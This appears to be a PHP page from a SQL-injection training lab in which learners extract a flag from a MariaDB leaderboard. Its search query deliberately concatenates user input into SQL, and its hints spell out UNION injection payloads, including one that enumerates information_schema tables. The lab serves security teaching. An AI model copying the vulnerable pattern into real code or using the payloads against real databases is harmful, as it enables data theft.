<?php
require_once __DIR__ . '/../../includes/db.php';

$mode = $_GET['mode'] ?? 'black';
$verify_error = null;

/* =====================
   FLAG VERIFY
===================== */
if (isset($_POST['admin_password'])) {
    $submitted = $_POST['admin_password'];

    $res = mysqli_query(
        $conn,
        "SELECT flag_value FROM window_flags WHERE id=1 LIMIT 1"
    );
    $row = mysqli_fetch_assoc($res);

    if ($row && $submitted === $row['flag_value']) {
        $_SESSION['mariadb_lab8_solved'] = true;
        header("Location: " . url_lab_from_slug("mariadb/lab8", $mode));
        exit;
    } else {
        $verify_error = "Incorrect. Keep trying!";
    }
}
?>

<!-- Lab Description -->
<div class="card">
    <h3>Lab 8. Window Functions for Extraction</h3>

    <h4>Scenario</h4>
    <p>
        A gaming leaderboard displays player scores with their rankings. The application
        uses MariaDB <strong>window functions</strong> like <code>ROW_NUMBER()</code>,
        <code>RANK()</code>, and <code>DENSE_RANK()</code> to compute rankings.
    </p>
    <p>
        Window functions are powerful SQL features that perform calculations across a set
        of rows related to the current row. They can be exploited in injection scenarios
        to extract data through subquery expressions in the <code>OVER()</code> clause
        or by combining them with UNION queries:
    </p>

    <div class="terminal">
        <div class="terminal-header">
            <span class="terminal-dot red"></span>
            <span class="terminal-dot yellow"></span>
            <span class="terminal-dot green"></span>
            <span class="terminal-title">Window Functions. Concept</span>
        </div>
        <div class="terminal-body">
            <span class="prompt">mariadb&gt; </span>SELECT player, score,<br>
            &nbsp;&nbsp;ROW_NUMBER() OVER (ORDER BY score DESC) as rank_num,<br>
            &nbsp;&nbsp;RANK() OVER (ORDER BY score DESC) as rank_pos,<br>
            &nbsp;&nbsp;DENSE_RANK() OVER (ORDER BY score DESC) as dense_pos<br>
            FROM scores;<br><br>
            <span class="comment">-- Window functions compute values across the result set</span><br>
            <span class="comment">-- without collapsing rows like GROUP BY does</span>
        </div>
    </div>

    <h4>Objective</h4>
    <p>
        The leaderboard lookup is vulnerable to UNION injection. The query uses
        <code>ROW_NUMBER() OVER()</code> to generate rankings, meaning it returns
        4 columns. Use this to extract the <strong>flag value</strong> from the
        hidden <code>window_flags</code> table. Try using window functions in your
        own UNION payload for bonus points.
    </p>

    <h4>Hints</h4>
    <span class="hint-toggle" data-hint="hint1">&#128161; Click for hints</span>
    <div id="hint1" class="hint-content">
        1. The query returns 4 columns: player, score, rank_num (from ROW_NUMBER), and a label.<br>
        2. Try: <code>' UNION SELECT flag_value, NULL, NULL, NULL FROM window_flags -- -</code><br>
        3. Use window functions in UNION: <code>' UNION SELECT flag_value, 0, ROW_NUMBER() OVER(), 'injected' FROM window_flags -- -</code><br>
        4. Enumerate tables: <code>' UNION SELECT table_name, NULL, NULL, NULL FROM information_schema.tables WHERE table_schema=database() -- -</code><br>
        5. Try RANK: <code>' UNION SELECT flag_value, 9999, RANK() OVER(ORDER BY 1), 'pwned' FROM window_flags -- -</code>
    </div>
</div>

<!-- Verify Flag -->
<div class="card">
    <h4>Submit Flag Value</h4>
    <form method="POST" class="form-row">
        <input type="text" name="admin_password" class="input" placeholder="Enter the flag value..." required>
        <button type="submit" class="btn btn-primary">Verify</button>
    </form>

    <?php if ($verify_error): ?>
        <div class="result-error result-box"><?= htmlspecialchars($verify_error) ?></div>
    <?php endif; ?>
</div>

<!-- Solved Banner -->
<?php if (!empty($_SESSION['mariadb_lab8_solved'])): ?>

<div class="solved-banner">
    <span class="solved-icon">&#127942;</span>
    <div>
        <div class="solved-title">Lab Solved!</div>
        <div class="solved-desc">You exploited a query using window functions and extracted the flag via UNION injection with ROW_NUMBER()/RANK() OVER().</div>
    </div>
</div>

<?php else: ?>

<!-- Vulnerable Query Interface -->
<div class="card">
    <h4>Leaderboard Search</h4>
    <form method="POST" class="form-row">
<input type="text" name="player" class="input" placeholder="Search player (try: Dragon)" value="<?= htmlspecialchars($_POST['player'] ?? '') ?>">
        <button type="submit" class="btn btn-primary">Search</button>
    </form>
</div>

<?php
if (isset($_POST['player'])) {
    $player = $_POST['player'];

    // INTENTIONALLY VULNERABLE: direct string concatenation with window function
    $query = "SELECT player, score, ROW_NUMBER() OVER (ORDER BY score DESC) as rank_num, 'leaderboard' as source FROM scores WHERE player LIKE '%$player%'";

    // Show the executed query in a terminal block
    echo '<div class="terminal">';
    echo '  <div class="terminal-header">';
    echo '    <span class="terminal-dot red"></span>';
    echo '    <span class="terminal-dot yellow"></span>';
    echo '    <span class="terminal-dot green"></span>';
    echo '    <span class="terminal-title">MariaDB Query</span>';
    echo '  </div>';
    echo '  <div class="terminal-body" data-highlight="sql">';
    echo '    <span class="prompt">mariadb&gt; </span>' . htmlspecialchars($query);
    echo '  </div>';
    echo '</div>';

    // Execute and display results
    try {
    $result = mysqli_query($conn, $query);

    if (!$result) {
        echo '<div class="result-error result-box">';
        echo '<strong>MariaDB Error:</strong><br>' . htmlspecialchars(mysqli_error($conn));
        echo '</div>';
    } else {
        $rows = [];
        while ($row = mysqli_fetch_assoc($result)) {
            $rows[] = $row;
        }

        if (empty($rows)) {
            echo '<div class="result-warning result-box">No players found matching that name.</div>';
        } else {
            echo '<table class="result-table">';
            echo '<tr><th>Rank</th><th>Player</th><th>Score</th><th>Source</th></tr>';
            foreach ($rows as $row) {
                echo '<tr>';
                echo '<td>#' . htmlspecialchars($row['rank_num'] ?? '') . '</td>';
                echo '<td>' . htmlspecialchars($row['player'] ?? '') . '</td>';
                echo '<td>' . htmlspecialchars($row['score'] ?? '') . '</td>';
                echo '<td>' . htmlspecialchars($row['source'] ?? '') . '</td>';
                echo '</tr>';
            }
            echo '</table>';
        }
    }
    } catch (mysqli_sql_exception $e) {
        echo '<div class="result-error result-box">';
        echo '<strong>MariaDB Error:</strong><br>' . htmlspecialchars($e->getMessage());
        echo '</div>';
    }
}
?>

<?php endif; ?>
